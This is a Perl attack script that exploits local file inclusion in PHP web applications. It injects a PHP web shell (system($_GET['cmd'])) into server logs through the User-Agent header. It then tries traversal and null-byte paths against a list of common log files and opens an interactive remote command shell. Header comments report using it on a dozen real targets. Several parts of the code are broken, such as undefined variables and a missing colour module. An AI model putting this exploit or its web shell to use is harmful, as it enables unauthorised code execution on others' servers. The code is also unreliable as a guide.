# REWRITE author => ArkAngeL43
# author OG      => MrEAX apart of the offical ec_se5c_secur_team staff and administration
# Love you bro   => No homo! :DDDD 
#
#
#
# Script originally made by the ec_se5c_secur_team had some errors in it, being written in perl 
# 3, i needed to use it for RR5 and decided what better way to ask the admin aka a very good friend 
# who personally wont be expressed or talked about here. to well revamp it, we got on a few calls 
# and discussed errors with the script which was the following
#
#
# Errors:
#   Args wouldnt parse, instead it jsust called the help fucntion 
#   Code needed to be updated and secured more considering there were some glitches
#   Main function was a mess and really caused errors in the script
#   95% of the targets we tested it on that were vulnerable did not work or err'ed out
#   Got NIL memory indifference error when testing with go
#   Would not connect to all forms of URL's
#   File testing and vulnerability testing would not work or run properly
#   Upon spawing the shell the shell would crash
#   etc....
#
#
# there was alot of errors with this script and alot of things we needed to change 
# such as the list above, it was in all my honor to work with this admin again going old school
# This script will inject or spawn a PHP reverse shell through local file inclusion 
# Note that even after re development sometimes ytu will get this error 
#
#
#[.... Maximumn tries *5* reached /productbycat.php?catId=7.
#[.... Maximumn tries *5* reached /productbycat.php?catId=7.
#[.... Maximumn tries *5* reached /productbycat.php?catId=7.
#[.... Maximumn tries *5* reached /productbycat.php?catId=7.
#[.... Maximumn tries *5* reached <?php $var = 322 + 191; echo(""); echo($var); echo(""); ?>.
#[.... Maximumn tries *5* reached <?php echo(""); system($_GET['cmd']); echo(""); ?>.
#
# This just means simply libwhisker could not properly parse the URI/URLEX with the 
# proper payloads thus not being able to control or contain a reverse shell
# despite me trying on some websites that were vulnerable to Local File Inlcusion 
# it didnt work all the time and when it did sometimes it would just break.
# this is a simple PoC ( proof of concept ) when it comes down to reverse shells through LFI vul
# nerabilities
#
#
#
# Contribs: In contribution to the Red Rabbit project i would like to thank 
#EAX, 
#   TOX,
#       JtRIPer,
#             ErrorProne,
#                    Hellspawn,
#                           And all other current n3t security team members for this wonderful
#                           COllaboration and helping out contributing to this project. 
#
# Dev -> ArkAngeL43 all proper authors have been disclosed
#
#
#Final product was tested in total of 32 times on 12 different targets, out of the 12 only 4 of them managed
#To finally pull through and run the shell which was active and easy to use.
#
#
#
#


use Time::HiRes qw(sleep);
use open qw(:std :encoding(UTF-8));
# feature
use feature 'say';
# main mods
use Time::HiRes qw(usleep);
use Getopt::Std;
# using LWP simple for http req
use HTTP::Tiny;
# use Lib whisker 2
use LW2;

# flush the STDOUT
STDOUT->autoflush(1);
# elimnating the use of third party color modules 
# use Term::ANSIColor;
#  total modules
my @nums = 1 .. 5;
# MAKE THE USE OF MY LOCAL AND THE USE OF LOCAL MY 
# the variables in the original script were declared as public variables 
# when they were only seen by one function 
my $version = "5.10.0";
# call first function before my calls sub routines 
########################### PARSING OF OPTIONS #####################################
#
# GETOOPT
# declare options
my %opts = (            
);
# t = target  / host 
# e = extension / url
# i = input / 
getopt('t:e:i:', \%opts);
my $target_   = $opts{t};
my $extension = $opts{e};
my $input_t     = $opts{i};
# http clients
my $Client = HTTP::Tiny->new();
main();
# main and used public variables
# includes shell, random int generation decleration, and catche log
my $input = $opts{i};
my $url   = $opts{e};
my $host  = $opts{t};
 
my $var1  = Generate_integer_type_main_module_1();
my $var2  = Generate_integer_type_main_module_1();
my $total = $var1 + $var2;
 
my $open  = Generate_string_type_main_module_2(4);
my $close = Generate_string_type_main_module_2(8);
 
my $beginning   = Generate_string_type_main_module_2(6);
my $ending      = Generate_string_type_main_module_2(4);
my $shell       = '<?php echo("'.$beginning.'"); system($_GET[\'cmd\']); echo("'.$ending.'"); ?>';
my $sled        = "../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..";
my @logs        = `cat httpdlogs.conf`;
my $test        = '<?php $var = ' . $var1 . ' + ' . $var2 . '; echo("' . $open . '"); echo($var); echo("' . $close . '"); ?>';
 
# Test for /proc/self/environ && user_agent injection.
my @files = (
    "./err.log",
    "./error_log",
    "./error.log",
    "/etc/httpd/conf/logs/error_log",
    "/etc/httpd/logs/error_log",
    "/home/php5/logs/error_log",
    "../log/error_log",
    "../log/error.log",
    "../logs/error_log",
    "../logs/error.log",
    "/proc/self/fd/2",
    "/usr/local/apache2/log/error_log",
    "/usr/local/apache2/logs/error_log",
    "/usr/local/apache2/logs/error.log",
    "/usr/local/apache/error.log",
    "/usr/local/apache/log/error_log",
    "/usr/local/apache/logs/error_log",
    "/usr/local/apachessl/logs/dummy-host.example.com-error_log",
    "/usr/local/apachessl/logs/error_log",
    "/usr/local/httpd/log/error_log",
    "/usr/local/httpd/logs/error_log",
    "/usr/local/php/log/error_log",
    "/var/log/apache2/error_log",
    "/var/log/apache2/error.log",
    "/var/log/apache/error_log",
    "/var/log/httpd-error.log",
    "/var/log/httpd/error_log",
    "/var/log/nginx/error.log",
    "/var/log/php-fcgi/error_log",
    "/var/log/php-fpm/err.log",
);
#my $file = "/proc/self/environ";
for my $ul (@files) {
    print "\n\033[38m[....WARNING: Testing filename -> $ul";
    test_matches($url,$test,$shell,$ul);
}

 
my $lol_error   = download_pt1_module_1_c3($test,$host,"wget/mozilla");
my $lol_shelled = download_pt1_module_1_c3($shell,$host,"wget/Mozilla");



#test_matches($url,$test,$shell,$file); 

#
#
#
# UNCHANGED CODE FIX AND STD/IZE
sub test_matches {
    # testing matches for URL and or methods of creating/spawning a shell
   my $url  = shift;
   my $test = shift;
   my $win  = shift;
   my $file = shift;   
   print "\033[37m\n[..... Running test -> $file\n";
   test_match($url,$test,$win,$file);
   print "\033[37m\n[..... Running test -> $sled$file\n";
   test_match($url,$test,$win,"$sled$file");
   print "\033[37m\n[..... Running test -> $file%00\n";
   test_match($url,$test,$win,"$file%00");
   print "\033[37m\n[..... Running test -> $sled$file%00\n";
   test_match($url,$test,$win,"$sled$file%00");
}
 
sub test_match {
    my $urn   = shift;
    my $use   = shift;
    my $win   = shift;
    my $match = shift;
    $urn =~ s/$input=[^\&\?\;]+/$input=$match/g;
 
    my ($l1,$l2,$l0) = test_rxe(download_pt1_module_1_c3($urn,$host,$use));
    if ($l0 gt 0) {
        print "\033[32m[....Successful code execution on $urn\nSpawning shell...\n\033[39m";
        spawn_shell($urn,$win);
    } else {
        spawn_shell($urn,$win);
        print "]....WARN: ERR: CAUGHT =>  Rex did not match $urn";
    }
}


sub spawn_shell {
    my $urk = shift;
    my $use = shift;
 
    my $username = parse_rxe(download_pt1_module_1_c3($urk . "&cmd=whoami",$host,$use),$beginning,$ending);
    my $hostname = parse_rxe(download_pt1_module_1_c3($urk . "&cmd=hostname",$host,$use),$beginning,$ending);
    chomp($username);
    chomp($hostname);
 
    while (1) {
        print color 'bold green';
        # changed WARNING for user in case a Shell didnt parse correctly attempt to spawn one anyway
        if ($username == "") {
            print "\033[33m>> WARNING: << ERROR: PERL: LINE 179 during execution of shell USR: ERR\n";
            print "\033[33m>> WARNING: >> ERROR: A Username for this host was not picked up or defined this\n";
            print "\033[33m>> WARNING: >> ERROR: Might mean that the shell was not properly spawned or the \n";
            print "\033[33m>> WARNING: >> ERROR: URL was not responsive to the attempted injections\n";
            say "\n\n";
        }
        # ~ ArkAngeL43
        # make another if statement fopr the hostname in the sense that the connection didnt respond a proper answer 
        # or all tests have failed, let user know as well that the error as the following:
        #
        #[.... Maximumn tries reached to URI> =? * /productbycat.php? *
        #[.... Maximumn tries reached to URI> =? * /productbycat.php?&cmd=whoami *
        #[.... Maximumn tries reached to URI> =? * /productbycat.php?&cmd=hostname *
        #
        # Means that the host was not responsive with an answer not via status but via test
        #
        #
        # Decided to try spawn shell anyway despite it not responding correctly
        if ($hostname == "") {
            print "\n\033[31m>> WARNING: << ERROR: PERL: LINE 179 during execution of shell USR: ERR\n";
            print "\n\033[31m>> WARNING: >> ERROR: A HOSTNAME for this host was not picked up or defined this\n";
            print "\n\033[31m>> WARNING: >> ERROR: Might mean that the shell was not properly spawned or the \n";
            print "\n\033[31m>> WARNING: >> ERROR: URL was not responsive to the attempted injections\n";
            say "This could indicate that the shell was not spawned.\n\n";
        }
        print "$username\@$hostname | LFI_Shell> ";
        print " \$ ";
        # declare input
        my $input = <>;
        $input =~ s/\ /%20/g;
        chomp($input);
        # there was a . but why? ~ ArkAngeL43
        # period is to seperate string names ~ EAX
        #
        # but output still contains => [.... Maximumn tries *5* reached /productbycat.php?&cmd=hostname. ~ ArkAngel43 
        #
        #
        # This is due to the . at the end of the print statement ~ EAX
        #
        #
        # the period in the print parse_rxe will not be included in the STDOUT statement ~ EAX
        # once the func <> >> parses then point it to the parse_rxe and the download module to tesst 
        # if this command passed, if this resulted in a true boolean based response then return the 
        # data the host server responded with 
        #
        #
        # ~ ArkAngeL43
        print parse_rxe(download_pt1_module_1_c3($urk . "&cmd=$input",$host,$use),$beginning,$ending);
    }
}

sub parse_rxe {
    my $output  = shift;
    my $begin   = shift;
    my $end     = shift;
    my $mangler = Generate_string_type_main_module_2(10);
    $output =~ s/\n/$mangler/g;
    $output =~ /$begin(.+)$end/g;
    my $ret = $1;
    $ret =~ s/$mangler/\n/g;
    return($ret);
}
 
sub test_rxe
{
    my $output = shift;
    if ($output =~ /$open(.*)$close/g) {
        my $test_data = $1;
        if ($test_data =~ /(.*)$total(.*)/g) {
            my $preslack  = $1;
            my $postslack = $2;
            return($preslack,$postslack,1);
        }
    }
    return (0,0,0);
}
 


# create generation of random strings and integers
#
#
#
# Names: generate_string_type_main_module_2($), Generate_integer_type_main_module_1


sub Generate_string_type_main_module_2($) {
    my $len_of_str = shift(@_); # @_ declares the very first argument in the lin 
    for (my $i = 0; $i < $len_of_str; $i++) {
        $string_n1.=$chars[rand(@chars)];
    }
    print "\n\033[32m[...<< New String > $string_n1\n";
    return $string_n1;
}

sub Generate_integer_type_main_module_1() {
    print "\n\033[34m[...> Generating random integer\n";
    my $int = int(rand(500 - 100 + 1)) + 100;
    print "\n\033[32m[...<< New integer > $int";
    return $int;
}


# download function with LW2
sub download_pt1_module_1_c3() {
    # download variables 
    my $uri  = shift;
    my $try  = 5;
    my $host = shift;
    my $ua   = shift;
    my %request;
    my %response;
    # LW2 decleration
    LW2::http_init_request(\%request);
    $request{'whisker'}->{'method'} = "GET";
    $request{'whisker'}->{'host'} = $target;
    $request{'whisker'}->{'uri'} = $uri;
    $request{'whisker'}->{'encode_anti_ids'} = 9;
    $request{'User-Agent'} = $ua;
    LW2::http_fixup_request(\%request);
    if(LW2::http_do_request(\%request, \%response)) {
        if($try < 5) {
            print "\033[31m].... < Failed to fetch $uri on try $try. Retrying...\n";
            return undef if(!download_pt1_module_1_c3($uri, $try++));
        }
        print "\033[31m[.... Maximumn tries reached to URI> =? * $uri *\n";
        return undef;
    } else {
        return ($response{'whisker'}->{'data'});
    }
}


# ascii load script
sub ascii_load() {
    local $| = 1;
    foreach my $c (@nums) {
        print "\n\t\t Loading modules -> $c";
        usleep(100000);
        print ("\b" x length($c));
    }
    print "\n[+] Modules loaded";
}

sub banner() {
    print "\x1b[H\x1b[2J\x1b[3J";
    open(FL, "nr.txt") or die "[ - ] ERR: Could not read or open file nr.txt $!";
    while(<FL>) {
        print "\033[34m$_";
    }
    # outputting the data under a while loop for the banner
    #
    #
    # read, write etc modes in perl
    #
    #   Sr.No.	Entities & Definition
    #  1	
    # < or r
    #
    #   Read Only Access
    #
    #   2	
    #  > or w
    #
    #   Creates, Writes, and Truncates
    #
    #   3	
    #  >> or a
    # Writes, Appends, and Creates
    #4	
    #+< or r+
    #
    #   Reads and Writes
    #
    #   5	
    #  +> or w+
    #
    #   Reads, Writes, Creates, and Truncates
    #
    #   6	
    #  +>> or a+
    #
    #   Reads, Writes, Appends, and Creates
}

# make requyest and test 
sub request_test_method_URL_target_Get_block_main() {
    my @urls = (
        $target_,
    );
    for my $target (@urls) {
        print "\n";
        print "\n\033[31m<< Testing URL for a standard connection  > $target\n";
        my $response = $Client->get($target);
        # ~ArkANgeL43 should we check through a list of HTTP status codes?
        #
        #
        if($target, $response->{status} == '200') {
            print "\n\033[32m<< Satus > Connection made | code | 2|00| ok >/ \n"
        }
    }
}

# make a help and script usage section 
sub script_usage() {
    banner();
    print "\n\033[34m Perl version -> $version";
    print "\n\033[34m---------------------------------------------------------";
    print "\n\033[31m]...[!] Error caught: A flag might not have been defined";
    print "\n\033[31m]...[!] Something happened during execution to call ";
    print "\n\033[31m]...[!] <SUBROUT> Script_Usage <LN> Script: 71: Dev code 78";
    # dev code 78 initaties help due to a fatal error upon execution
    print "\nFlags: \n";
    print "\t -host  | - String\n";
    print "\t -urlex | - String\n";
    print "\t -i     | - String\n";
    print "\nUsage: \033[32m";
    print "\n\t\033[31mperl lfi.pl -host <Domain> -urlex <`Extension`> -i etc\n";
    print "\n\t\033[34mExample: perl lfi.pl -host www.exmaple.com -urlex `/vuln.ext?page=main&foo=bar` -i page \n";
}


# target_data and table
sub table_() {
    print "\n\033[36m Perl version -> $version";
    print "\n\033[34m---------------------------------------------------------";
    # dev code 991 is a OK status
    print "\n]...Dev code 991 * TARGET DATA SUCESS LOAD *  \n";
    print "\n\033[31m<< Target URL   > $target_";
    print "\n\033[31m<< Target Host  > $extension";
    print "\n\033[31m<< Target Input > $input_t\n";
    say("");
}

sub main() {
    banner();
    # load the modules
    ascii_load();
    # load the attack data table to show PoC that the data rendered
    table_();
    # now test the URL's and make a connection to the host
    request_test_method_URL_target_Get_block_main();
} 